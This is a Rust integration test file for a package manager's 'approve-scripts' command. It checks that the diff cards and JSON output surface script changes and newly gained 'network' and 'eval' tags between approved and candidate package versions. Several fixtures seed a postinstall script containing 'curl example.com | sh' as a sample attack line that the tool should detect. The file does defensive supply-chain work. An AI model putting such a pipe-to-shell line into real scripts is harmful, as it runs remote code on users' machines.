//! Phase 46 P7 Chunk 5 — reference-fixture integration tests.
//!
//! These tests are the §11 P7 ship-criteria gate at the CLI level:
//!
//! 1. **Script-hash drift surfaces the exact added line** — updating
//!    a package whose postinstall added `curl example.com | sh`
//!    between approved v1 and candidate v2 must surface that exact
//!    line in `lpm approve-scripts` output **before any execution**.
//!    The unified-diff section (rendered via `diffy`) is the wire
//!    contract.
//!
//! 2. **Behavioral-tag delta surfaces the gained tags** — when v2
//!    adds `network` and `eval` to a package that previously had only
//!    `crypto`, the install-time and approve-scripts outputs must show
//!    `+ network` and `+ eval`. The terse hint, the human card, and
//!    the JSON enrichment all surface this.
//!
//! ## Why subprocess + the approve-scripts path
//!
//! The C2 install render path can't be exercised end-to-end without
//! a real `lpm install` run (which requires lockfile-validated
//! integrity against a registry — the P6 harness comment explains
//! the same blocker). The diff-rendering CONTRACT is identical
//! between the install pre-autobuild card and the approve-scripts
//! TUI card (both call `render_preflight_card`); the C5 fixture
//! therefore exercises the contract through `lpm approve-scripts
//! --list` (human + JSON), which lands the same render at the
//! exact byte level the install path would.
//!
//! Pure-decision proofs of both ship criteria live in
//! `crate::version_diff::tests` (`render_preflight_card_*`) and
//! `commands::install::tests` (`p7_post_install_hints_*`). C5 is the
//! end-to-end subprocess proof: real binary, real fd separation,
//! real LpmRoot resolution, real store/manifest/build-state read
//! pipeline.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

// ── Harness ────────────────────────────────────────────────────────
//
// Mirrors `p6_triage_autoexec_reference.rs`'s shape so a future
// reader has one mental model for "Phase 46 P-N reference fixture."
// Differences from P6: this fixture seeds TWO versions of one
// package (the prior + the candidate) and an explicit
// build-state.json that claims the candidate is blocked, since we
// can't drive the real install path that would have written it.

fn run_lpm(cwd: &Path, home: &Path, args: &[&str]) -> (std::process::ExitStatus, String, String) {
    let exe = env!("CARGO_BIN_EXE_lpm-rs");
    let output = Command::new(exe)
        .args(args)
        .current_dir(cwd)
        .env("LPM_HOME", home.join(".lpm"))
        .env("HOME", home)
        .env("NO_COLOR", "1")
        .env("LPM_NO_UPDATE_CHECK", "1")
        .env("LPM_DISABLE_TELEMETRY", "1")
        .env_remove("RUST_LOG")
        .output()
        .expect("failed to spawn lpm-rs");
    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    (output.status, stdout, stderr)
}

fn strip_ansi(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\u{1b}' && chars.peek() == Some(&'[') {
            chars.next();
            for cc in chars.by_ref() {
                let cb = cc as u32;
                if (0x40..=0x7e).contains(&cb) {
                    break;
                }
            }
        } else {
            out.push(c);
        }
    }
    out
}

/// Seed a synthetic package version into `<home>/.lpm/store/v1/`
/// with `name@version/package.json` containing the given
/// `postinstall` body.
///
/// `name` may be scoped or unscoped; scoped names get the
/// `/` → `+` rewrite the real store applies. Returns the package
/// directory so callers can inspect / further-decorate it.
fn seed_package(home: &Path, name: &str, version: &str, postinstall: &str) -> PathBuf {
    let safe_name = name.replace(['/', '\\'], "+");
    let pkg_dir = home
        .join(".lpm")
        .join("store")
        .join("v1")
        .join(format!("{safe_name}@{version}"));
    fs::create_dir_all(&pkg_dir).unwrap();
    fs::write(
        pkg_dir.join("package.json"),
        format!(
            r#"{{"name":"{name}","version":"{version}","scripts":{{"postinstall":{}}}}}"#,
            serde_json::Value::String(postinstall.into())
        ),
    )
    .unwrap();
    fs::write(pkg_dir.join(".integrity"), "sha512-fixture-skip-verify").unwrap();
    pkg_dir
}

/// Synthesize a `<project>/.lpm/build-state.json` with one blocked
/// entry — the candidate version we want `lpm approve-scripts` to
/// surface a diff for. The fields are the post-Phase-46-P1+P7 shape:
///
/// - `script_hash` distinguishes drift from no-change (the diff core
///   compares this against the binding's stored hash).
/// - `behavioral_tags` + `behavioral_tags_hash` populate the
///   candidate side of the tag-diff dimension. Pass `None` to leave
///   the dimension empty.
/// - `static_tier` is `"green"` so the entry would auto-execute
///   under triage+autoBuild — matching the install-time scenario
///   the diff card protects.
fn write_blocked_build_state(
    project: &Path,
    name: &str,
    version: &str,
    script_hash: &str,
    behavioral_tags: Option<&[&str]>,
    behavioral_tags_hash: Option<&str>,
) {
    fs::create_dir_all(project.join(".lpm")).unwrap();
    let tags_block = match (behavioral_tags, behavioral_tags_hash) {
        (Some(tags), Some(hash)) => format!(
            r#""behavioral_tags": {}, "behavioral_tags_hash": "{}","#,
            serde_json::to_string(tags).unwrap(),
            hash,
        ),
        _ => String::new(),
    };
    let body = format!(
        r#"{{
            "state_version": 1,
            "blocked_set_fingerprint": "sha256-fixture-stable",
            "captured_at": "2026-04-22T00:00:00Z",
            "blocked_packages": [
                {{
                    "name": "{name}",
                    "version": "{version}",
                    "integrity": "sha512-fixture-skip-verify",
                    "script_hash": "{script_hash}",
                    "phases_present": ["postinstall"],
                    "binding_drift": false,
                    "static_tier": "green",
                    {tags_block}
                    "published_at": "2026-04-22T00:00:00Z"
                }}
            ]
        }}"#
    );
    fs::write(project.join(".lpm").join("build-state.json"), body).unwrap();
}

/// Write a `package.json` with a `trustedDependencies` rich entry for
/// the **prior** approved version. The keys mirror the on-disk wire
/// shape per `lpm-workspace::TrustedDependencyBinding`'s serde
/// renames: `scriptHash`, `behavioralTagsHash`, `behavioralTags`.
fn write_project_with_prior_binding(
    project: &Path,
    pkg_name: &str,
    prior_version: &str,
    prior_script_hash: &str,
    prior_behavioral_tags: Option<&[&str]>,
    prior_behavioral_tags_hash: Option<&str>,
) {
    let prior_tags_block = match (prior_behavioral_tags, prior_behavioral_tags_hash) {
        (Some(tags), Some(hash)) => format!(
            r#","behavioralTagsHash":"{}","behavioralTags":{}"#,
            hash,
            serde_json::to_string(tags).unwrap(),
        ),
        _ => String::new(),
    };
    let body = format!(
        r#"{{
            "name": "p7-fixture-project",
            "version": "0.0.1",
            "lpm": {{
                "trustedDependencies": {{
                    "{pkg_name}@{prior_version}": {{
                        "integrity": "sha512-fixture-skip-verify",
                        "scriptHash": "{prior_script_hash}"
                        {prior_tags_block}
                    }}
                }}
            }}
        }}"#
    );
    fs::write(project.join("package.json"), body).unwrap();
}

struct Fixture {
    _tmpdir: tempfile::TempDir,
    home: PathBuf,
    project: PathBuf,
}

impl Fixture {
    fn new() -> Self {
        let tmpdir = tempfile::tempdir().unwrap();
        let home = tmpdir.path().to_path_buf();
        let project = home.join("project");
        fs::create_dir_all(&project).unwrap();
        Fixture {
            _tmpdir: tmpdir,
            home,
            project,
        }
    }
}

// ── Ship criterion 1: exact added line surfaces in approve-scripts ──

/// §11 P7 ship criterion 1 — scenario A.
///
/// Updating a package whose postinstall added `curl example.com | sh`
/// between approved v1 and candidate v2 surfaces the **exact added
/// line** in `lpm approve-scripts --list` output. The unified-diff
/// section is rendered via `diffy` and the `+curl example.com | sh`
/// line must appear verbatim — this is the literal P7 contract.
///
/// This test exercises the approve-scripts path because we can't drive
/// the real install path in a synthetic harness (P6 fixture
/// commentary). The diff renderer is shared between install's
/// pre-autobuild card and the approve-scripts card, so a passing
/// assertion here proves both sites' rendering contract.
#[test]
fn p7_chunk5_script_hash_drift_surfaces_added_curl_pipe_in_approve_scripts_list() {
    let fx = Fixture::new();

    // Seed both versions in the store. Body of v1: a benign `echo`.
    // Body of v2: same `echo` PLUS the canonical attack shape
    // `curl example.com | sh`. The diff must surface the second line
    // of v2 as `+curl ...`.
    seed_package(&fx.home, "shapeshift", "1.0.0", "echo hi");
    seed_package(
        &fx.home,
        "shapeshift",
        "2.0.0",
        "echo hi\ncurl example.com | sh",
    );

    // Project manifest: prior approval bound to v1 with a stable
    // synthetic script_hash. The candidate v2's hash will differ
    // (we set it explicitly below in the build-state) so the diff
    // classifier flags ScriptHashDrift.
    write_project_with_prior_binding(
        &fx.project,
        "shapeshift",
        "1.0.0",
        "sha256-shapeshift-v1-fixture",
        None,
        None,
    );

    // Build-state synthesizes the install-time blocked-set capture
    // for v2 with a different script_hash (drift signal).
    write_blocked_build_state(
        &fx.project,
        "shapeshift",
        "2.0.0",
        "sha256-shapeshift-v2-fixture",
        None,
        None,
    );

    // Run `lpm approve-scripts --list` — non-interactive, prints the
    // package card AND (with C3's wiring) the version-diff card per
    // entry that has a prior binding.
    let (status, stdout, stderr) = run_lpm(&fx.project, &fx.home, &["approve-scripts", "--list"]);
    let stdout = strip_ansi(&stdout);
    let stderr = strip_ansi(&stderr);

    assert!(
        status.success(),
        "approve-scripts --list must exit 0. stdout={stdout}\nstderr={stderr}"
    );

    // The diff card prints to stdout (TUI is stdout-driven). Assert:
    // - Header names the candidate AND the prior version.
    assert!(
        stdout.contains("shapeshift@2.0.0 — changes since v1.0.0:"),
        "diff card header must name candidate + prior version. stdout={stdout}"
    );

    // - The exact added line surfaces in the unified diff. This IS
    //   the P7 ship criterion: the user sees the malicious line
    //   verbatim, not just "scripts changed."
    assert!(
        stdout.contains("+curl example.com | sh"),
        "ship criterion 1 violated — the literal added line must \
         surface in the diff card. stdout=\n{stdout}"
    );

    // - The phase header tells the user WHERE the line lives so they
    //   can correlate against the package's package.json without
    //   guessing.
    assert!(
        stdout.contains("scripts.postinstall"),
        "phase header (scripts.postinstall) must appear so the user \
         knows which lifecycle phase changed. stdout={stdout}"
    );
}

/// §11 P7 ship criterion 1 — JSON channel.
///
/// Same scenario as the human test above, but verifies that the
/// `--json` machine channel carries a structured `version_diff`
/// object with `reason: "script-hash-drift"` so agents can route
/// without parsing the human card.
#[test]
fn p7_chunk5_script_hash_drift_emits_structured_version_diff_in_json() {
    let fx = Fixture::new();
    seed_package(&fx.home, "shapeshift", "1.0.0", "echo hi");
    seed_package(
        &fx.home,
        "shapeshift",
        "2.0.0",
        "echo hi\ncurl example.com | sh",
    );
    write_project_with_prior_binding(
        &fx.project,
        "shapeshift",
        "1.0.0",
        "sha256-shapeshift-v1-fixture",
        None,
        None,
    );
    write_blocked_build_state(
        &fx.project,
        "shapeshift",
        "2.0.0",
        "sha256-shapeshift-v2-fixture",
        None,
        None,
    );

    let (status, stdout, _stderr) = run_lpm(
        &fx.project,
        &fx.home,
        &["--json", "approve-scripts", "--list"],
    );
    let stdout = strip_ansi(&stdout);
    assert!(status.success());

    let parsed: serde_json::Value = serde_json::from_str(stdout.trim()).unwrap_or_else(|e| {
        panic!(
            "approve-scripts --list --json stdout must be parseable JSON. \
             Parse error: {e}\nStdout:\n{stdout}"
        )
    });

    // SCHEMA_VERSION 3 expected (P7 Chunk 4 bump).
    assert_eq!(parsed["schema_version"].as_u64(), Some(3));

    let blocked = parsed["blocked"]
        .as_array()
        .expect("blocked must be an array");
    assert_eq!(blocked.len(), 1, "exactly one blocked entry expected");
    let entry = &blocked[0];
    assert_eq!(entry["name"], serde_json::json!("shapeshift"));
    assert_eq!(entry["version"], serde_json::json!("2.0.0"));

    let vd = &entry["version_diff"];
    assert!(
        vd.is_object(),
        "version_diff must be an object when prior binding exists. entry={entry}"
    );
    assert_eq!(vd["reason"], serde_json::json!("script-hash-drift"));
    assert_eq!(vd["prior_version"], serde_json::json!("1.0.0"));
    assert_eq!(vd["candidate_version"], serde_json::json!("2.0.0"));
    assert_eq!(vd["script_hash_drift"], serde_json::json!(true));
    assert!(vd["behavioral_tags_added"].is_null());
    assert!(vd["behavioral_tags_removed"].is_null());
    assert!(vd["provenance_drift_kind"].is_null());
}

// ── Ship criterion 2: behavioral tag delta surfaces ────────────────

/// §11 P7 ship criterion 2.
///
/// Updating a package whose behavioral tags gained `network` and
/// `eval` between approved v1 and candidate v2 surfaces both gained
/// tags in the human diff card. The prior version had only
/// `crypto`; the candidate has `crypto + eval + network`. The diff
/// card must name `+ eval` and `+ network` explicitly so the user
/// sees the security-posture shift, not just "tags changed."
///
/// Same store package.json bodies between v1 and v2 (no script
/// drift) so this test isolates the tag dimension and proves the
/// tag-only renderer fires correctly.
#[test]
fn p7_chunk5_behavioral_tag_drift_surfaces_gained_network_and_eval_in_card() {
    let fx = Fixture::new();
    // Same script body on both sides — only the metadata-derived
    // tag set drifts. (In production the tags come from the
    // registry's server-computed analysis; the diff core compares
    // the persisted name set.)
    seed_package(&fx.home, "creep", "1.0.0", "node build.js");
    seed_package(&fx.home, "creep", "2.0.0", "node build.js");

    write_project_with_prior_binding(
        &fx.project,
        "creep",
        "1.0.0",
        "sha256-creep-script-same",
        Some(&["crypto"]),
        Some("sha256-creep-tags-v1"),
    );
    write_blocked_build_state(
        &fx.project,
        "creep",
        "2.0.0",
        "sha256-creep-script-same",
        Some(&["crypto", "eval", "network"]),
        Some("sha256-creep-tags-v2"),
    );

    let (status, stdout, stderr) = run_lpm(&fx.project, &fx.home, &["approve-scripts", "--list"]);
    let stdout = strip_ansi(&stdout);
    let stderr = strip_ansi(&stderr);
    assert!(
        status.success(),
        "approve-scripts --list must exit 0. stdout={stdout}\nstderr={stderr}"
    );

    // Header names candidate + prior.
    assert!(
        stdout.contains("creep@2.0.0 — changes since v1.0.0:"),
        "diff card header missing. stdout={stdout}"
    );

    // Behavioral-tag section uses `+ <name>` for gained tags. The
    // ordering matches `active_tag_names()` (sorted lex) — so eval
    // appears before network in the card.
    assert!(
        stdout.contains("+ eval"),
        "ship criterion 2 violated — `+ eval` must appear when the \
         candidate gained the eval tag. stdout=\n{stdout}"
    );
    assert!(
        stdout.contains("+ network"),
        "ship criterion 2 violated — `+ network` must appear when \
         the candidate gained the network tag. stdout=\n{stdout}"
    );

    // No "Script content changed" header — the script bodies match,
    // so only the tag section should render. Pin so a regression
    // that emits a misleading empty script-diff doesn't sneak in.
    assert!(
        !stdout.contains("Script content changed"),
        "tag-only drift must NOT emit a script-content section when \
         the bodies are identical. stdout={stdout}"
    );
}

/// §11 P7 ship criterion 2 — JSON channel.
///
/// `--json` carries the gained / lost tag arrays so agents can route
/// on the tag delta without parsing the human card.
#[test]
fn p7_chunk5_behavioral_tag_drift_emits_gained_arrays_in_json() {
    let fx = Fixture::new();
    seed_package(&fx.home, "creep", "1.0.0", "node build.js");
    seed_package(&fx.home, "creep", "2.0.0", "node build.js");
    write_project_with_prior_binding(
        &fx.project,
        "creep",
        "1.0.0",
        "sha256-creep-script-same",
        Some(&["crypto"]),
        Some("sha256-creep-tags-v1"),
    );
    write_blocked_build_state(
        &fx.project,
        "creep",
        "2.0.0",
        "sha256-creep-script-same",
        Some(&["crypto", "eval", "network"]),
        Some("sha256-creep-tags-v2"),
    );

    let (status, stdout, _stderr) = run_lpm(
        &fx.project,
        &fx.home,
        &["--json", "approve-scripts", "--list"],
    );
    let stdout = strip_ansi(&stdout);
    assert!(status.success());

    let parsed: serde_json::Value = serde_json::from_str(stdout.trim())
        .unwrap_or_else(|e| panic!("invalid JSON: {e}\nstdout:\n{stdout}"));

    let entry = &parsed["blocked"][0];
    let vd = &entry["version_diff"];
    assert_eq!(vd["reason"], serde_json::json!("behavioral-tag-shift"));
    assert_eq!(vd["script_hash_drift"], serde_json::json!(false));
    // Gained tags surface as a JSON array in lex order.
    assert_eq!(
        vd["behavioral_tags_added"],
        serde_json::json!(["eval", "network"]),
        "agents read tags_added as an array; the gained-only case \
         must produce `[eval, network]`. vd={vd}"
    );
    // Tag dimension drifted, but nothing was lost — empty array,
    // NOT null. (Empty array means \"dimension drifted, no losses\";
    // null means \"dimension didn't drift.\" Agents need this distinction.)
    assert_eq!(
        vd["behavioral_tags_removed"],
        serde_json::json!([]),
        "behavioral_tags_removed must be `[]` (not null) — the tag \
         dimension drifted, just with no losses. vd={vd}"
    );
}

// ── Stream separation control ──────────────────────────────────────

/// Pin that the `--list --json` path produces ONE valid JSON document
/// on stdout, regardless of how many blocked entries have prior
/// bindings producing diff data. This is the agent-facing
/// stream-separation contract for P7 (matches the P6 Chunk 5
/// stream-separation pin for the post-auto-build pointer).
#[test]
fn p7_chunk5_list_json_stays_parseable_with_version_diff_enrichment() {
    let fx = Fixture::new();
    seed_package(&fx.home, "shapeshift", "1.0.0", "echo hi");
    seed_package(
        &fx.home,
        "shapeshift",
        "2.0.0",
        "echo hi\ncurl example.com | sh",
    );
    write_project_with_prior_binding(&fx.project, "shapeshift", "1.0.0", "sha256-v1", None, None);
    write_blocked_build_state(&fx.project, "shapeshift", "2.0.0", "sha256-v2", None, None);

    let (status, stdout, _stderr) = run_lpm(
        &fx.project,
        &fx.home,
        &["--json", "approve-scripts", "--list"],
    );
    let stdout = strip_ansi(&stdout);
    assert!(status.success());

    // Stdout MUST be exactly one parseable JSON document — no human
    // card text bleeding into the machine channel. If a regression
    // accidentally routed `print_version_diff_card_for_blocked`'s
    // println! through stdout in JSON mode, this parse fails with
    // the offending shape printed for diagnosis.
    let _: serde_json::Value = serde_json::from_str(stdout.trim()).unwrap_or_else(|e| {
        panic!(
            "stream separation broken — stdout under --json must be \
             one parseable JSON document. Parse error: {e}\nstdout:\n{stdout}"
        )
    });
}

// ── No-prior-binding control ───────────────────────────────────────

/// First-time review (no prior binding for the same package name)
/// must NOT render a diff card and must emit `version_diff: null` in
/// the JSON. This is the C1 contract `latest_binding_for_name`
/// returns None for, surfaced through both UX paths.
#[test]
fn p7_chunk5_first_time_review_emits_null_version_diff_and_no_card() {
    let fx = Fixture::new();
    // Only the candidate version is in the store; no prior version
    // exists.
    seed_package(&fx.home, "first-timer", "1.0.0", "node build.js");
    // Project manifest has NO trustedDependencies entry for this
    // package — first-time review shape.
    fs::write(
        fx.project.join("package.json"),
        r#"{
            "name": "p7-fixture-project",
            "version": "0.0.1",
            "lpm": {}
        }"#,
    )
    .unwrap();
    write_blocked_build_state(
        &fx.project,
        "first-timer",
        "1.0.0",
        "sha256-first-timer",
        None,
        None,
    );

    // Human path: `--list` MUST NOT print a "changes since v..."
    // header (no prior to compare against).
    let (status, stdout, _stderr) = run_lpm(&fx.project, &fx.home, &["approve-scripts", "--list"]);
    let stdout = strip_ansi(&stdout);
    assert!(status.success());
    assert!(
        !stdout.contains("changes since"),
        "first-time review must NOT emit a diff card. stdout={stdout}"
    );

    // JSON path: `version_diff` MUST be `null`.
    let (_, json_stdout, _) = run_lpm(
        &fx.project,
        &fx.home,
        &["--json", "approve-scripts", "--list"],
    );
    let json_stdout = strip_ansi(&json_stdout);
    let parsed: serde_json::Value = serde_json::from_str(json_stdout.trim())
        .unwrap_or_else(|e| panic!("invalid JSON: {e}\nstdout:\n{json_stdout}"));
    let entry = &parsed["blocked"][0];
    assert!(
        entry["version_diff"].is_null(),
        "first-time review must emit version_diff: null. entry={entry}"
    );
}
